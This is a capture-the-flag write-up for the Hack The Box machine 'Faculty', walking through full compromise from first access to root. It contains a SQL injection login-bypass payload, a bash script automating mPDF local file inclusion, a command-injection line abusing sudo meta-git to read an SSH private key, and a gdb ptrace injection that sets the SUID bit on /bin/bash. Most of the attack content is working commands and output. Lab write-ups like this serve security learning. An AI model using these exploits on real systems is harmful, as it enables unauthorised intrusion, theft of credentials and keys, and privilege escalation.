# Faculty
## User flag

```shell
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

The machine starts quite easily with a simple sql injection in the admin page that can be find by fuzzing. The payload admin' OR '1'='1 will bypass the login.

Then after inspecting the page It's clear that the next step is probably hacking the pdf downlaod since it is the main functionality of the page. Thanks to the url we know that the software being use is mpdf, searching on google by mpdf exploit I found and LFI exploit and later it [github issue](https://github.com/mpdf/mpdf/issues/356) that explains how to exploit it.. If you interceipt the request with burp you can see that the pdf data is url encoded two times and base64 encoded once. So I decided to create a bash script to automate the LFI proccess

```bash
#!/bin/bash


while true
do
        echo -n "enter file to donwload: "
        read file
        payload="<annotation file=\"$file\" content=\"$file\"  icon=\"Graph\" title=\"Attached File: $file\" pos-x=\"195\" />"

        payload=$(echo $payload | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
        payload=$(echo $payload | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))")
        payload=$(echo $payload | base64)
        pdf=$(curl -s -d "pdf=$payload" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://faculty.htb/admin/download.php)
        timeout 0.5 wget http://faculty.htb/mpdf/tmp/$pdf &>/dev/null
        if [ $? -ne 0 ]
        then
                echo "file not found"
        else
                pdfdetach -save 1 $pdf  &>/dev/null
                rm $pdf
        fi

done
```

After getting /etc/passwd I kept searching in the page until I found a interesting route /var/www/scheduling/admin/admin.class.php and inside this file the is a reference to db\_connect.php so I donwloaded that one too and found I password. With the user from passwd and the password I connected to the user gbyolo with the pasword but I wasn't the user yet.

after executing sudo -l I found out that user gbyolo can execute meta-git as developer

```shell
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo:
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

I started searching vulnerabilties and found this [HackerOne report](https://hackerone.com/reports/728040) So i used it to get the ssh key from user developer.


```shell
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
```

**Be aware that running it in gbyolo home won't work since developer cat access that directory**. Next just get the user flag


```shell
[dasor@archlinux ~/.ssh]$ ssh -i htb_rsa developer@faculty.htb
developer@faculty:~$ cat user.txt
```

## Root flag

If we execute linepeas the fact that gdb is in path apppear ins red many times also by executing the group command we can see that the use developer is in the debug group

```shell
developer@faculty:/tmp$ groups
developer debug faculty
```

So I checked gdb and realised it had the ptrace capabylity so I attached it to a python proccess that was beeing run by root and escalated privileges

```shell
developer@faculty:/tmp$ ps -aux | grep root | grep python
root         732  0.0  0.9  26896 18120 ?        Ss   Aug13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
developer@faculty:/tmp$ gdb -p 732
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
...
0x00007f7238649967 in __GI___poll (fds=0x1a01a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 36079]
(gdb) quit
A debugging session is active.

        Inferior 1 [process 732] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/python3.8, process 732
[Inferior 1 (process 732) detached]
developer@faculty:/tmp$ /bin/bash -p
bash-5.0# whoami
root
```
